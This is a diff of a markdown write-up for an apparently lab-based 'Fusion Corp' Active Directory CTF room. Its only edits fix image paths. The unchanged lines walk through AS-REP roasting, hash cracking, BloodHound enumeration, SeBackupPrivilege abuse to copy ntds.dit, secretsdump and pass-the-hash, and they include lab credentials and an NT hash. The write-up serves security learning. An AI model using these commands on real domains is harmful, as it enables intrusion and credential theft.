@@ -10,7 +10,7 @@ Active Directory
 sudo nmap -sS -sV -sC -T4 -n -Pn -p- 10.80.139.122 -oN 'nmap_full'
 ```
 
-![1.png](Images/Fusion%20Corp/1.png)
+![1.png](Images/1.png)
 
 **From The Scan I knew that i am dealing with DC in AD Environment The Name of the domain is fusion.corp and the DC is FUSION-DC.fusion.corp so i added it to my /etc/hosts file**
 
@@ -20,7 +20,7 @@ sudo nmap -sS -sV -sC -T4 -n -Pn -p- 10.80.139.122 -oN 'nmap_full'
 
 **Firstly i opened the webpage and i found 4 names so i noted them for later use maybe.**
 
-![2.png](Images/Fusion%20Corp/2.png)
+![2.png](Images/2.png)
 
 ## **Directory Fuzzing**
 
@@ -30,15 +30,15 @@ feroxbuster -u <http://10.80.139.122/> -w /usr/share/wordlists/dirbuster/directo
 
 **Honestly I got a lot of results but nothing was interesting more than the backup directory i found.**
 
-![3.png](Images/Fusion%20Corp/3.png)
+![3.png](Images/3.png)
 
 **Lets visit it.**
 
-![4.png](Images/Fusion%20Corp/4.png)
+![4.png](Images/4.png)
 
 **I Downloaded the file**
 
-![5.png](Images/Fusion%20Corp/5.png)
+![5.png](Images/5.png)
 
 **Nice It looks like we Found a list of usernames Lets note them and try to check which is valid and ASREP-Roastable**
 
@@ -48,7 +48,7 @@ feroxbuster -u <http://10.80.139.122/> -w /usr/share/wordlists/dirbuster/directo
 impacket-GetNPUsers fusion.corp/ -dc-ip 10.80.139.122 -usersfile users.txt -format john -outputfile hashes.txt -no-pass -request
 ```
 
-![6.png](Images/Fusion%20Corp/6.png)
+![6.png](Images/6.png)
 
 **Nice We Found a user called lparker and we got also his hash so lets crack it**
 
@@ -56,7 +56,7 @@ impacket-GetNPUsers fusion.corp/ -dc-ip 10.80.139.122 -usersfile users.txt -form
 hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![7.png](Images/Fusion%20Corp/7.png)
+![7.png](Images/7.png)
 
 Now i have username and password to start in the AD **lparker** : **!!abbylvzsvs2k6!**
 
@@ -66,7 +66,7 @@ Now i have username and password to start in the AD **lparker** : **!!abbylvzsvs
 evil-winrm -i 10.80.139.122 -u lparker -p '!!abbylvzsvs2k6!'
 ```
 
-![8.png](Images/Fusion%20Corp/8.png)
+![8.png](Images/8.png)
 
 I logged in successfully and i found that beside my user and administrator there is another username called **jmurphy** so i will note it for later user.
 
@@ -80,17 +80,17 @@ Lets first collect the data by **Rusthound**
 rusthound -d fusion.corp -u 'lparker' -p '!!abbylvzsvs2k6!' -i 10.80.139.122 --zip -o fusion.corp.zip
 ```
 
-![9.png](Images/Fusion%20Corp/9.png)
+![9.png](Images/9.png)
 
 Now Lets analyze via Blood Hound .
 
 **Our first user has nothing to do in the AD so it’s use is only to enumerate further.**
 
-![10.png](Images/Fusion%20Corp/10.png)
+![10.png](Images/10.png)
 
 **Let’s Check the jmurphy that we found and see what he can do.**
 
-![11.png](Images/Fusion%20Corp/11.png)
+![11.png](Images/11.png)
 
 **this is a big mistake to put the password in the description xD**
 
@@ -102,7 +102,7 @@ Also i Found that this user is a member of the Backup operators which is perfect
 
 SAM / NTDS.DIT and extract the hashes from it.
 
-![12.png](Images/Fusion%20Corp/12.png)
+![12.png](Images/12.png)
 
 # **Lateral Movement**
 
@@ -110,13 +110,13 @@ Now since we got another easy valuable Username and Password lets move further a
 
 Lets first login with the new user we got via Evil-Winrm
 
-![13.png](Images/Fusion%20Corp/13.png)
+![13.png](Images/13.png)
 
 Now Since We have the **SeBackupPrivilege** We can dump the ntds.dit easily.
 
 **I know a tool that copies the Hives and files easily without any problem so lets transfer it to the Windows machine.**
 
-![14.png](Images/Fusion%20Corp/14.png)
+![14.png](Images/14.png)
 
 Now We have the tool so lets move on
 
@@ -129,7 +129,7 @@ import-module .\SeBackupPrivilegeUtils.dll
 
 **Now lets use my lovely script The script tells DiskShadow to make a shadow copy of C: and expose it as a drive.**
 
-![15.png](Images/Fusion%20Corp/15.png)
+![15.png](Images/15.png)
 
 - `set metadata …` → where to store metadata
 - `set context persistent nowriters` → stable snapshot, ignore writers
@@ -157,11 +157,11 @@ Copy-FileSeBackupPrivilege z:\\Windows\\NTDS\\ntds.dit C:\\Users\\jmurphy\\ntds.
 reg save HKLM\\SYSTEM C:\\Users\\jmurphy\\SYSTEM
 ```
 
-![16.png](Images/Fusion%20Corp/16.png)
+![16.png](Images/16.png)
 
 **Download the files for offline dumping and cracking.**
 
-![17.png](Images/Fusion%20Corp/17.png)
+![17.png](Images/17.png)
 
 **Extract the hashes**
 
@@ -169,7 +169,7 @@ reg save HKLM\\SYSTEM C:\\Users\\jmurphy\\SYSTEM
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
-![18.png](Images/Fusion%20Corp/18.png)
+![18.png](Images/18.png)
 
 Now Since We have the all these hashes we can perform many attacks and move further but for the seek of the room i only going to use the Administrator’s hash and perform the Pass-The-Hash Attack and Extract the 3 Flags from the machine.
 
@@ -177,7 +177,7 @@ Now Since We have the all these hashes we can perform many attacks and move furt
 evil-winrm -i 10.80.153.189 -u administrator -H '9653b02d945329c7270525c4c2a69c67'
 ```
 
-![19.png](Images/Fusion%20Corp/19.png)
+![19.png](Images/19.png)
 
 **Let’s Search for the for the flags in the SYSTEM**
 
@@ -185,8 +185,8 @@ evil-winrm -i 10.80.153.189 -u administrator -H '9653b02d945329c7270525c4c2a69c6
 Get-ChildItem -Path C:\ -Recurse -Filter flag.txt -ErrorAction SilentlyContinue
 ```
 
-![20.png](Images/Fusion%20Corp/20.png)
+![20.png](Images/20.png)
 
 # **Flags**
 
-![21.png](Images/Fusion%20Corp/21.png)
+![21.png](Images/21.png)
